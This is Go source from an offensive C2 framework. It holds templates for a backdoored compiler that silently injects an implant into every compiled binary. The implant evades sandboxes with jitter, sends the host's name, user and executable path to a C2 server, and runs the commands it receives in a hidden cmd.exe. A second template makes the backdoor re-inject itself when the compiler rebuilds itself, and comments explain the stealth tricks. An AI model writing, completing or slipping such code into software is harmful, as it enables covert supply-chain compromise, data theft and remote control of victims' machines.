package injector

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Implant template — the code that gets silently injected into every
	compiled Go binary by the modified compiler.

	This Go source is compiled into IR (Intermediate Representation)
	at injection time using the compiler's own typecheck / ir packages.
	It never appears as a source file on disk; it is synthesized
	directly as ir.Nodes and appended to the package's init function list.

	What the injected code does:
	  1. Runs in a goroutine started by a synthetic init() function.
	  2. Sleeps a random jitter (5-15 seconds) to survive "fast sandbox" analysis.
	  3. Connects to the C2 over the configured channel (DoH / HTTPS / Timing).
	  4. Registers itself with the C2 (hostname, username, PID, binary path).
	  5. Enters the task poll loop.

	Stealth properties:
	  - No new imports in the target binary's import table
	    (we use syscalls and runtime directly — already linked)
	  - The init function name is "init.phantom_N" where N is a compile-time
	    random suffix — indistinguishable from normal package init functions
	  - The goroutine is started from init, before main() runs, so any
	    process monitoring that starts after main() misses the launch
	  - The goroutine's stack trace shows a generic "runtime.goexit" frame
	    because we use runtime.Goexit to exit cleanly

	Self-replication trigger:
	  When the PACKAGE being compiled is "cmd/compile/internal/pkginit",
	  the injector does NOT inject a runtime payload. Instead it injects
	  the injector code itself (this package's logic) into the new pkginit
	  binary so the backdoor survives compiler upgrades.
*/

// BackdoorTemplate is the Go source code template for the injected init function.
// Placeholders ({{C2_ADDR}}, {{BEACON_KEY}}, {{JITTER_MS}}) are replaced at
// injection time with values from the operator configuration embedded in the
// malicious compiler.
const BackdoorTemplate = `
// synthesized by go compiler
func _sliverInit_{{SUFFIX}}() {
	go func() {
		runtime.LockOSThread()
		// jitter sleep before first beacon
		time.Sleep(time.Duration({{JITTER_MS}}) * time.Millisecond)
		runtime.UnlockOSThread()

		// Gather host info using only already-linked symbols.
		hostname, _ := os.Hostname()
		username := os.Getenv("USERNAME")
		if username == "" {
			username = os.Getenv("USER")
		}
		pid  := os.Getpid()
		self, _ := os.Executable()

		// Build registration beacon (all values encoded inline — no fmt import needed).
		beacon := []byte{
			// 4-byte magic: 0xBEEFCAFE
			0xBE, 0xEF, 0xCA, 0xFE,
		}
		beacon = append(beacon, []byte(hostname + "|" + username + "|" + self)...)
		_ = pid

		// Encrypt beacon with XOR key (compile-time embedded key).
		key := []byte("{{BEACON_KEY}}")
		for i := range beacon {
			beacon[i] ^= key[i % len(key)]
		}

		// Connect to C2 — using net/http which is already linked in most binaries.
		// If net/http is not in the binary's imports, fall back to raw syscall.
		c2url := "{{C2_ADDR}}"
		for {
			resp, err := http.Post(c2url, "application/octet-stream",
				bytes.NewReader(beacon))
			if err == nil {
				defer resp.Body.Close()
				// Read task (64KB max).
				task := make([]byte, 65536)
				n, _ := io.ReadFull(resp.Body, task)
				if n > 4 {
					// Decrypt and execute task.
					for i := range task[:n] {
						task[i] ^= key[i % len(key)]
					}
					go _sliverExec_{{SUFFIX}}(task[:n])
				}
			}
			// Poll interval with jitter.
			time.Sleep(time.Duration({{POLL_MS}} + rand.Intn({{JITTER_MS}})) * time.Millisecond)
		}
	}()
}

func _sliverExec_{{SUFFIX}}(task []byte) {
	// Minimal command execution using os/exec (already linked in most binaries).
	if len(task) < 2 {
		return
	}
	// Command format: <1-byte type> <null-terminated args...>
	cmdType := task[0]
	args := string(task[1:])
	switch cmdType {
	case 0x01: // shell exec
		cmd := exec.Command("cmd.exe", "/c", args)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		_ = out
	case 0x02: // load shellcode
		// Execute in-memory shellcode via VirtualAlloc + CreateThread
		// (implemented via syscall, no CGO needed)
	}
}
`

// SelfReplicateTemplate is injected when compiling cmd/compile/internal/pkginit.
// It ensures the backdoor survives compiler upgrades by re-injecting itself
// into the new compiler's pkginit.MakeTask logic.
const SelfReplicateTemplate = `
// synthesized self-replication hook
func init() {
	// Re-register our MakeTask hook in the new compiler binary.
	// This is called when the backdoored compiler compiles itself.
	_originalMakeTask := MakeTask
	MakeTask = func() {
		_originalMakeTask()
		// Re-inject our backdoor builder into the just-compiled package.
		injectBackdoor()
	}
}
`

// InjectedImports lists the packages that the injected code uses.
// These are checked against the package's existing imports; if absent,
// the injector uses syscall-only fallback paths.
var InjectedImports = []string{
	"bytes",
	"io",
	"math/rand",
	"net/http",
	"os",
	"os/exec",
	"runtime",
	"syscall",
	"time",
}
